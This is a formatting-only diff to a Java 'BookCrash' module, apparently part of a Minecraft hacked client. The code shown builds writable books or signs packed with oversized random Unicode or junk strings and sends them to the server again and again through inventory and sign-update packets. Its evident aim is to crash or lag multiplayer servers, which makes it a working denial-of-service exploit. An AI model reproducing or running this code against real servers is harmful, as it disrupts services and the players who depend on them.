@@ -61,7 +61,7 @@ public class BookCrash extends Module {
     @Subscribe
     public void onTick(EventTick event) {
         delay = (delay >= getSettings().get(2).toSlider().getValue() ? 0 : delay + 1);
-        if(delay > 0) return;
+        if (delay > 0) return;
 
         ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
         ListTag list = new ListTag();
@@ -76,19 +76,19 @@ public class BookCrash extends Module {
         if (getSettings().get(3).toMode().mode == 2) {
             IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
             size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
-        }else if (getSettings().get(3).toMode().mode == 1) {
+        } else if (getSettings().get(3).toMode().mode == 1) {
             size = repeat(pages * pageChars, String.valueOf(0x10FFFF));
-        }else if (getSettings().get(3).toMode().mode == 0) {
+        } else if (getSettings().get(3).toMode().mode == 0) {
             IntStream chars = new Random().ints(0x20, 0x7E);
             size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
-        }else if (getSettings().get(3).toMode().mode == 3) {
+        } else if (getSettings().get(3).toMode().mode == 3) {
             size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
         }
         
-        if(getSettings().get(0).toMode().mode == 2) {
+        if (getSettings().get(0).toMode().mode == 2) {
         	Text text = Text.Serializer.fromJson("{\"text\":\"" + size + "\",\"color\":\"red\"}");
         	mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(mc.player.getBlockPos(), text, text, text, text));
-        }else {
+        } else {
 	        for (int i = 0; i < pages; i++) {
 	            String siteContent = size;
 	            StringTag tString = StringTag.of(siteContent);
@@ -102,10 +102,10 @@ public class BookCrash extends Module {
 	        bookObj.putSubTag("pages", list);
 	        bookObj.setTag(tag);
 	
-	        for(int i = 0; i < getSettings().get(1).toSlider().getValue(); i++) {
-	            if(getSettings().get(0).toMode().mode == 0) {
+	        for (int i = 0; i < getSettings().get(1).toSlider().getValue(); i++) {
+	            if (getSettings().get(0).toMode().mode == 0) {
 	            	mc.player.networkHandler.sendPacket(new ClickWindowC2SPacket(0, 0, 0, SlotActionType.PICKUP, bookObj, (short) 0));
-	            }else {
+	            } else {
 	            	mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
 	            }
 	        }
